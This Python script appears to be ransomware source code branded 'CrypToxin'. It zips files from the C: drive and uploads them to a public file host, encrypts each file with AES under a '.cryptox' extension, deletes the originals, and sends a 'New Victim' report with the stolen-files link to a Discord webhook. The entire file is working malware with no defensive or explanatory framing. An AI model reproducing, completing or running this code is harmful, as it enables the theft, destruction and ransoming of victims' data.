import os
import glob
import zipfile
import secrets
import datetime
import requests
from Crypto.Cipher import AES

victim_id = secrets.token_hex(4)

key = secrets.token_bytes(16)

with open('C:\\key.bin', 'wb') as f:
    f.write(key)

directories = ['C:/']

zip_filename = f'victim_files_{victim_id}.zip'
with zipfile.ZipFile(zip_filename, 'w') as zip_file:
    for directory in directories:
        files = glob.glob(os.path.join(directory, '*'))
        for file in files:
            zip_file.write(file)

url = 'https://api.anonfiles.com/upload'
with open(zip_filename, 'rb') as f:
    files = {'file': (zip_filename, f)}
    response = requests.post(url, files=files)
upload_link = response.json()['data']['file']['url']['full']

encrypted_file_count = 0
for directory in directories:
    files = glob.glob(os.path.join(directory, '*'))

    for file in files:
        with open(file, 'rb') as f:
            data = f.read()

        padded_data = data + b'\0' * (AES.block_size - len(data) % AES.block_size)

        cipher = AES.new(key, AES.MODE_CBC)
        encrypted_data = cipher.iv + cipher.encrypt(padded_data)

        encrypted_file = file + ".cryptox"
        with open(encrypted_file, 'wb') as f:
            f.write(encrypted_data)

        os.remove(file)
        encrypted_file_count += 1

report_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
report = {
    "content": "",
    "embeds": [
        {
            "title": "New Victim",
            "color": 0x9400D3,
            "author": {
                "name": "CrypToxin",
                "icon_url": "https://cdn.discordapp.com/attachments/1066174115490312222/1087035215660200066/poison.png"
            },
            "fields": [
                {
                    "name": "📁Victim's files",
                    "value": f"```{upload_link}```"
                },
                {
                    "name": "🆔Victim ID",
                    "value": f"{victim_id}"
                },
                {
                    "name": "🔒Number of encrypted files",
                    "value": f"{encrypted_file_count}"
                },
                {
                    "name": "📅Infection date",
                    "value": f"{report_date}"
                }
            ]
        }
    ]
}

webhook_url = ""
response = requests.post(webhook_url, json=report)









